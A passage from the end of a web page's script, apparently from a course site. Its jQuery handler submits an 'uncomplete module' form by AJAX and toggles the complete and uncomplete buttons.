        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>